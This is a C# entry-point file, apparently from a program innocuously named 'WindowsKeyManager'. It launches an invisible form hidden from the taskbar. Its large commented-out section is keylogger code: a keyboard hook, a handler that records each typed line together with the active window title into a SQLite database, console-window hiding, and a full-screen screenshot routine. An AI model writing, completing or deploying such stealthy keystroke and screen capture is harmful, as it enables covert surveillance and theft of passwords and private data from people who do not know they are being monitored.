namespace WindowsKeyManager
{
    using System;
    using System.Windows.Forms;

    internal class Program
    {
        //[DllImport("Kernel32.dll")]
        //private static extern IntPtr GetConsoleWindow();

        //[DllImport("User32.dll")]
        //private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);
        //[DllImport("user32.dll", CharSet = CharSet.Auto)]
        //private static extern IntPtr GetForegroundWindow();
        //[DllImport("user32.dll")]
        //private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        //private static string GetActiveWindowTitle()
        //{
        //    StringBuilder builder = new StringBuilder(255);
        //    GetWindowText(GetForegroundWindow(), builder, 100);
        //    return builder.ToString().Trim();

        //}

        //private static IKeyboardMouseEvents _mEvents;
        ////private StringBuilder cachBuilder;
        //private static string _lineBuilder;
        //private static string _logDbPath;
        [STAThread]
        public static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            //            if (args.Length > 0)
            //            {
            //                _logDbPath = args[0];
            //            }
            //            else
            //            {
            //                _logDbPath = $@"c:\temp";
            //            }
            //            _logDbPath= Path.Combine(_logDbPath, "Logmanager.db");
            //            CreateDbIfNot();
            ////            Console.WriteLine("Application was started");
            ////            IntPtr hWnd = GetConsoleWindow();
            ////            if (hWnd != IntPtr.Zero)
            ////            {
            ////                Console.WriteLine("Application will be hidded");
            ////                ShowWindow(hWnd, 0);                
            ////            }
            //SubscribeApplication();
            Application.Run(new Main()
            {
                Visible = false,
                FormBorderStyle = FormBorderStyle.None,
                WindowState = FormWindowState.Minimized,
                ShowInTaskbar = false,
                
            });

            //     
        }

        //        private static void SubscribeApplication()
        //        {
        //            Unsubscribe();
        //            Subscribe(Hook.AppEvents());
        //        }

        //         private void SubscribeGlobal()
        //        {
        //            Unsubscribe();
        //            Subscribe(Hook.GlobalEvents());
        //        }

        //        private static void Subscribe(IKeyboardMouseEvents events)
        //        {
        //            _mEvents = events;
        ////            m_Events.KeyDown += OnKeyDown;
        ////            m_Events.KeyUp += OnKeyUp;
        //            _mEvents.KeyPress += HookManager_KeyPress;

        ////            m_Events.MouseUp += OnMouseUp;
        ////            m_Events.MouseClick += OnMouseClick;
        ////            m_Events.MouseDoubleClick += OnMouseDoubleClick;
        ////
        ////            m_Events.MouseMove += HookManager_MouseMove;
        ////
        ////            m_Events.MouseDragStarted += OnMouseDragStarted;
        ////            m_Events.MouseDragFinished += OnMouseDragFinished;
        ////
        ////            if (checkBoxSupressMouseWheel.Checked)
        ////                m_Events.MouseWheelExt += HookManager_MouseWheelExt;
        ////            else
        ////                m_Events.MouseWheel += HookManager_MouseWheel;
        ////
        ////            if (checkBoxSuppressMouse.Checked)
        ////                m_Events.MouseDownExt += HookManager_Supress;
        ////            else
        ////                m_Events.MouseDown += OnMouseDown;
        //        }

        //        private static void Unsubscribe()
        //        {
        //            if (_mEvents == null) return;
        ////            m_Events.KeyDown -= OnKeyDown;
        ////            m_Events.KeyUp -= OnKeyUp;
        //            _mEvents.KeyPress -= HookManager_KeyPress;

        ////            m_Events.MouseUp -= OnMouseUp;
        ////            m_Events.MouseClick -= OnMouseClick;
        ////            m_Events.MouseDoubleClick -= OnMouseDoubleClick;
        ////
        ////            m_Events.MouseMove -= HookManager_MouseMove;
        ////
        ////            m_Events.MouseDragStarted -= OnMouseDragStarted;
        ////            m_Events.MouseDragFinished -= OnMouseDragFinished;
        ////
        ////            if (checkBoxSupressMouseWheel.Checked)
        ////                m_Events.MouseWheelExt -= HookManager_MouseWheelExt;
        ////            else
        ////                m_Events.MouseWheel -= HookManager_MouseWheel;
        ////
        ////            if (checkBoxSuppressMouse.Checked)
        ////                m_Events.MouseDownExt -= HookManager_Supress;
        ////            else
        ////                m_Events.MouseDown -= OnMouseDown;

        //            _mEvents.Dispose();
        //            _mEvents = null;
        //        }

        //        private static void HookManager_KeyPress(object sender, KeyPressEventArgs e)
        //        {
        //            var test = e.KeyChar.ToString();
        //            Console.WriteLine(test);
        //            if (e.KeyChar == (char)Keys.Back)
        //            {
        //                if (_lineBuilder.Length > 1) _lineBuilder = _lineBuilder.Substring(0, _lineBuilder.Length - 1);
        //                return;
        //            }

        //            if (e.KeyChar == (char)Keys.Enter)
        //            {
        //                InsertLoger(_lineBuilder);
        //                _lineBuilder = "";
        //                return;
        //            }
        //            _lineBuilder += e.KeyChar.ToString();
        //        }

        //        private static void InsertLoger(string line)
        //        {
        //            if (line.Trim().Length > 1)
        //            {
        //                var windowsTitle = GetActiveWindowTitle();
        //                var db = new SQLiteAsyncConnection(_logDbPath);
        //                db.InsertAsync(new Loger()
        //                {
        //                    TextLog = line,
        //                    DateLog = DateTime.Now.ToString("G"),
        //                    ApplicationTittle = windowsTitle
        //                });
        //            }
        //        }

        //        private static void CreateDbIfNot()
        //        {
        //           // var path = Path.Combine(_logDbPath, "Logmanager.db");
        //            if (!File.Exists(_logDbPath))
        //            {
        //                var db = new SQLiteConnection(_logDbPath);
        //                db.CreateTable<Loger>();
        //                db.Insert(new Loger()
        //                {
        //                    ApplicationTittle = "Test",
        //                    TextLog = "Text text ",
        //                    DateLog = DateTime.Now.ToString("G")
        //                });
        //            }
        //        }

        //private static void ScreenCopy()
        //{
        //    Bitmap screenshot = new Bitmap(SystemInformation.VirtualScreen.Width, 
        //        SystemInformation.VirtualScreen.Height, 
        //        PixelFormat.Format32bppArgb);
        //    Graphics screenGraph = Graphics.FromImage(screenshot);
        //    screenGraph.CopyFromScreen(SystemInformation.VirtualScreen.X, 
        //        SystemInformation.VirtualScreen.Y, 
        //        0, 
        //        0, 
        //        SystemInformation.VirtualScreen.Size, 
        //        CopyPixelOperation.SourceCopy);
        //        screenshot.Save("Screenshot.png", System.Drawing.Imaging.ImageFormat.Png);
        //}
    }

    //[Table("Logs")]
    //public class Loger
    //{
    //    [PrimaryKey, AutoIncrement, Column("IdLog")]
    //    public int Id { get; set; }
    //    [MaxLength(255)]
    //    public string ApplicationTittle { get; set; }
    //    public string TextLog { get; set; }
    //    public string DateLog { get; set; } = DateTime.Now.ToString("G");
    //}
}